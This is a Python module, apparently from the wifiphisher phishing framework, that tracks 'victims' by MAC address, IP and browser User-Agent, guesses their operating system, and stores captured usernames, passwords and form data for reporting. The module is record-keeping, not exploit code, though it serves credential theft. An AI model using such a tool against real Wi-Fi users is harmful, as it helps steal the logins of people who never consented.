"""
This module was made to handle victim scanning.
"""

import logging
import re
import time

import wifiphisher.common.constants as constants
from wifiphisher.common.macmatcher import MACMatcher as macmatcher

logger = logging.getLogger(__name__)

class VictimSystem(object):
    """Represents a victim system identified from a phishing attack."""

    def __init__(self, mac_address, ip_address=None, user_agent=None):
        """
        Initialize a victim system.

        :param self: A VictimSystem object
        :param mac_address: MAC address of the victim
        :param ip_address: IP address of the victim
        :param user_agent: User-Agent string from the victim's browser
        :type self: VictimSystem
        :type mac_address: str
        :type ip_address: str
        :type user_agent: str
        :return: None
        :rtype: None
        """

        # Victim's MAC address
        self.mac_address = mac_address
        # Victim's IP address
        self.ip_address = ip_address
        # Victim's User-Agent
        self.user_agent = user_agent
        # System/OS type, extracted from User-Agent
        self.system_type = self._identify_system_type()
        # First seen timestamp
        self.first_seen = time.strftime("%Y-%m-%d %H:%M:%S")
        # Last seen timestamp
        self.last_seen = time.strftime("%Y-%m-%d %H:%M:%S")
        # Vendor/OUI information (if available)
        self.vendor = None
        # Captured credentials
        self.credentials = []
        
    def _identify_system_type(self):
        """
        Identify the system type based on the User-Agent.
        
        :param self: A VictimSystem object
        :type self: VictimSystem
        :return: Type of system (Windows, Android, iOS, macOS, Linux, Unknown)
        :rtype: str
        """
        if not self.user_agent:
            return "Unknown"
            
        user_agent = self.user_agent.lower()
        
        if "windows" in user_agent:
            return "Windows"
        elif "android" in user_agent:
            return "Android"
        elif "iphone" in user_agent or "ipad" in user_agent:
            return "iOS"
        elif "macintosh" in user_agent or "mac os" in user_agent:
            return "macOS"
        elif "linux" in user_agent:
            return "Linux"
        else:
            return "Unknown"
            
    def add_credential(self, username=None, password=None, form_data=None):
        """
        Add captured credential to the victim.
        
        :param self: A VictimSystem object
        :param username: Captured username
        :param password: Captured password
        :param form_data: Any additional form data
        :type self: VictimSystem
        :type username: str
        :type password: str
        :type form_data: dict
        :return: None
        :rtype: None
        """
        cred = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "username": username,
            "password": password,
            "form_data": form_data or {}
        }
        
        self.credentials.append(cred)
        logger.info(f"Added credential for {self.mac_address}")
        
    def update_seen(self):
        """
        Update the last seen timestamp.
        
        :param self: A VictimSystem object
        :type self: VictimSystem
        :return: None
        :rtype: None
        """
        self.last_seen = time.strftime("%Y-%m-%d %H:%M:%S")
        
    def associate_vendor(self, vendor_name):
        """
        Associate vendor information with this victim.
        
        :param self: A VictimSystem object
        :param vendor_name: Name of the vendor
        :type self: VictimSystem
        :type vendor_name: str
        :return: None
        :rtype: None
        """
        self.vendor = vendor_name
        
    def as_dict(self):
        """
        Return a dictionary representation of the victim.
        
        :param self: A VictimSystem object
        :type self: VictimSystem
        :return: Dictionary with victim information
        :rtype: dict
        """
        return {
            "mac_address": self.mac_address,
            "ip_address": self.ip_address,
            "user_agent": self.user_agent,
            "system_type": self.system_type,
            "first_seen": self.first_seen,
            "last_seen": self.last_seen,
            "vendor": self.vendor,
            "credentials": self.credentials
        }
        
class VictimManager(object):
    """Handles victim systems from phishing attacks."""
    
    # Instance will be stored here
    __instance = None
    
    @staticmethod
    def get_instance():
        """
        Return the instance of the class or create new if none exists.
        
        :return: Instance of the VictimManager class
        :rtype: VictimManager
        """
        if VictimManager.__instance is None:
            VictimManager()
        return VictimManager.__instance
        
    def __init__(self):
        """
        Initialize VictimManager.
        
        :param self: A VictimManager object
        :type self: VictimManager
        :return: None
        :rtype: None
        """
        if VictimManager.__instance:
            raise Exception("Error: VictimManager class is a singleton!")
        else:
            VictimManager.__instance = self
            
        # Dictionary to store victims by MAC address
        self.victims = {}
        # Report object (if available)
        self.report = None
        
    def set_report(self, report):
        """
        Set the report object for automatic integration.
        
        :param self: A VictimManager object
        :param report: A Report object
        :type self: VictimManager
        :type report: Report
        :return: None
        :rtype: None
        """
        self.report = report
        
    def add_victim(self, mac_address, ip_address=None, user_agent=None):
        """
        Add or update a victim in the manager.
        
        :param self: A VictimManager object
        :param mac_address: MAC address of the victim
        :param ip_address: IP address of the victim
        :param user_agent: User-Agent string from the victim's browser
        :type self: VictimManager
        :type mac_address: str
        :type ip_address: str
        :type user_agent: str
        :return: The victim object
        :rtype: VictimSystem
        """
        if mac_address in self.victims:
            victim = self.victims[mac_address]
            # Update information if provided
            if ip_address:
                victim.ip_address = ip_address
            if user_agent:
                victim.user_agent = user_agent
                victim.system_type = victim._identify_system_type()
            victim.update_seen()
        else:
            # Create new victim
            victim = VictimSystem(mac_address, ip_address, user_agent)
            self.victims[mac_address] = victim
            logger.info(f"New victim added: {mac_address}")
            
            # Add to report if available
            if self.report:
                self.report.add_victim(mac_address, ip_address, user_agent)
                
        return victim
        
    def add_credential(self, mac_address, username=None, password=None, form_data=None):
        """
        Add credential for a victim.
        
        :param self: A VictimManager object
        :param mac_address: MAC address of the victim
        :param username: Captured username
        :param password: Captured password
        :param form_data: Any additional form data
        :type self: VictimManager
        :type mac_address: str
        :type username: str
        :type password: str
        :type form_data: dict
        :return: True if successful, False otherwise
        :rtype: bool
        """
        if mac_address not in self.victims:
            # Create victim if doesn't exist
            victim = self.add_victim(mac_address)
        else:
            victim = self.victims[mac_address]
            
        # Add credential to victim
        victim.add_credential(username, password, form_data)
        
        # Add to report if available
        if self.report:
            self.report.add_credential(mac_address, username, password, form_data)
            
        return True
        
    def get_victims_count(self):
        """
        Get the count of victims.
        
        :param self: A VictimManager object
        :type self: VictimManager
        :return: Count of victims
        :rtype: int
        """
        return len(self.victims)
        
    def get_credentials_count(self):
        """
        Get the count of all captured credentials.
        
        :param self: A VictimManager object
        :type self: VictimManager
        :return: Count of credentials
        :rtype: int
        """
        count = 0
        for mac, victim in self.victims.items():
            count += len(victim.credentials)
        return count
